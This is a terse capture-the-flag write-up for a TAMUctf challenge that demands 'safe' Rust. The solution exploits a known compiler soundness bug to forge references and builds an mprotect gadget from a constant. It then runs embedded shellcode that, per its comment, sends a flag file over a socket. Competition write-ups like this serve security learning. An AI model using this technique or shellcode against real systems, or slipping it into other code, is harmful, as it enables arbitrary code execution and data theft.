# Sacrifice
## Description
One of the TAMUctf devs committed some heinous crimes with `unsafe`, so Ferris cast our poor dev into UB jail. The almighty crab's ire can only be appeased with an offering of the finest, 110% safe, non-GMO Rust code -- can you make a worthy sacrifice and save our dev?

## solution

1. pain
2. https://github.com/rust-lang/rust/issues/25860
3. haha ub go brr

```rust
static UNIT: &'static &'static () = &&();

fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T { v }

fn lmao<'a, T>(x: &'a T) -> &'static T {
    let f: fn(_, &'a T) -> &'static T = foo;
    f(UNIT, x)
}


fn valid(a: usize, b: usize, c:u32) {}

fn make_funny_ref() -> &'static &'static fn(usize, usize, u32) {
    let r = &(valid as fn(usize, usize, u32));
    lmao(&r)
}

fn wrap_mprotect() {
    let x= 0xc3050f0000000ab8usize;
}

fn pwn(func: &'static &fn(usize, usize, u32), target: usize, shellcode: usize) {
    let r = &target;
    func(shellcode,0x1000,7);
}

// open socket 127.0.0.1:4444 and copy /sacrifice/flag.txt to it
static SHELLCODE: [u8; 116] = [106,41,88,106,2,95,106,1,94,153,15,5,72,137,197,72,184,1,1,1,1,1,1,1,2,80,72,184,3,1,16,93,126,1,1,3,72,49,4,36,106,42,88,72,137,239,106,16,90,72,137,230,15,5,104,117,121,117,1,129,52,36,1,1,1,1,72,184,99,101,47,102,108,97,103,46,80,72,184,47,115,97,99,114,105,102,105,80,106,2,88,72,137,231,49,246,15,5,65,186,255,255,255,127,72,137,198,106,40,88,72,137,239,153,15,5];
pub fn main() {
    let shellcode = &SHELLCODE as *const _  as usize;
    let real_mprotect = wrap_mprotect as fn() as *const ()  as usize + 3;
    let valid_ref = make_funny_ref();
    pwn(valid_ref, real_mprotect, shellcode >> 12 << 12); //
    pwn(valid_ref, shellcode, 0);
}
```

4. survive being executed for terrible writeup